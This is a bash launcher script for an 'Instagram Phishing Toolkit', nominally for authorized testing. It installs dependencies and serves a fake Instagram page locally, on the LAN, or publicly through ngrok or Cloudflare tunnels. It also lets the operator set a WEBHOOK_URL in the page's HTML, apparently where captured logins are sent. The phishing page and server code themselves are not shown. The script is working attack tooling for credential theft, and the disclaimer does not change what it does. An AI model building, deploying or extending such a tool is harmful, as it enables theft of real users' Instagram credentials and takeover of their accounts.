#!/bin/bash

# Instagram Phishing Tool - Kali Linux
# For authorized penetration testing only

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'

clear

echo -e "${CYAN}"
echo "  ╔═══════════════════════════════════════════╗"
echo "  ║        Instagram Phishing Toolkit         ║"
echo "  ║     Authorized Security Testing Only      ║"
echo "  ╚═══════════════════════════════════════════╝"
echo -e "${NC}"

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] This tool should be run with sudo for full functionality${NC}"
    echo -e "${YELLOW}[*] Continuing anyway...${NC}"
fi

# Check dependencies
echo -e "${YELLOW}[*] Checking dependencies...${NC}"

DEPS=("python3" "curl" "git")
MISSING=0

for dep in "${DEPS[@]}"; do
    if ! command -v $dep &> /dev/null; then
        echo -e "${RED}[!] Missing: $dep${NC}"
        MISSING=1
    fi
done

if [ $MISSING -eq 1 ]; then
    echo -e "${YELLOW}[*] Installing missing dependencies...${NC}"
    apt-get update -y
    apt-get install -y python3 python3-pip curl git
fi

# Install Python requirements
pip3 install flask requests 2>/dev/null

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WEB_DIR="$SCRIPT_DIR/web"
SERVER_DIR="$SCRIPT_DIR/server"

# Menu
echo ""
echo -e "${BOLD}Select an option:${NC}"
echo -e "${GREEN}  1)${NC} Local server (localhost) - Test locally"
echo -e "${GREEN}  2)${NC} Serve on LAN (0.0.0.0) - Other devices on network"
echo -e "${GREEN}  3)${NC} Serve with Ngrok - Public URL (internet)"
echo -e "${GREEN}  4)${NC} Serve with Cloudflare Tunnel"
echo -e "${GREEN}  5)${NC} Edit HTML/webhook settings"
echo -e "${RED}  q)${NC} Quit"
echo ""
read -p "Choice [1-5]: " choice

case $choice in
    1)
        echo -e "${GREEN}[+] Starting local server on http://localhost:8080${NC}"
        python3 "$SERVER_DIR/server.py" --host 127.0.0.1 --port 8080
        ;;
    2)
        IFACE=$(ip route | grep default | awk '{print $5}' | head -1)
        IP=$(ip addr show $IFACE | grep -oP 'inet \K[\d.]+' | head -1)
        echo -e "${GREEN}[+] Starting LAN server on http://$IP:8080${NC}"
        python3 "$SERVER_DIR/server.py" --host 0.0.0.0 --port 8080
        ;;
    3)
        if ! command -v ngrok &> /dev/null; then
            echo -e "${YELLOW}[*] Installing ngrok...${NC}"
            wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -O /tmp/ngrok.tgz
            tar -xzf /tmp/ngrok.tgz -C /usr/local/bin/
            rm /tmp/ngrok.tgz
            echo -e "${GREEN}[+] Ngrok installed${NC}"
        fi
        
        echo -e "${YELLOW}[*] Enter your ngrok auth token (from https://dashboard.ngrok.com):${NC}"
        read -s TOKEN
        ngrok authtoken $TOKEN 2>/dev/null
        
        echo -e "${GREEN}[+] Starting server on 0.0.0.0:8080 with ngrok tunnel...${NC}"
        python3 "$SERVER_DIR/server.py" --host 0.0.0.0 --port 8080 &
        sleep 2
        ngrok http 8080
        ;;
    4)
        if ! command -v cloudflared &> /dev/null; then
            echo -e "${YELLOW}[*] Installing cloudflared...${NC}"
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared
            chmod +x /usr/local/bin/cloudflared
            echo -e "${GREEN}[+] Cloudflared installed${NC}"
        fi
        
        echo -e "${GREEN}[+] Starting server with Cloudflare Tunnel...${NC}"
        python3 "$SERVER_DIR/server.py" --host 127.0.0.1 --port 8080 &
        sleep 2
        cloudflared tunnel --url http://127.0.0.1:8080
        ;;
    5)
        echo -e "${YELLOW}[*] Opening webhook configuration...${NC}"
        echo -e "Edit the WEBHOOK_URL in $WEB_DIR/index.html"
        echo -e "Current value:"
        grep -n "WEBHOOK_URL" "$WEB_DIR/index.html"
        echo ""
        read -p "Enter new webhook URL (or press Enter to skip): " NEW_URL
        if [ ! -z "$NEW_URL" ]; then
            sed -i "s|const WEBHOOK_URL = '.*'|const WEBHOOK_URL = '$NEW_URL'|" "$WEB_DIR/index.html"
            echo -e "${GREEN}[+] Updated!${NC}"
        fi
        # Re-run menu
        exec "$0"
        ;;
    q|Q)
        echo -e "${RED}[!] Exiting${NC}"
        exit 0
        ;;
    *)
        echo -e "${RED}[!] Invalid option${NC}"
        exec "$0"
        ;;
esac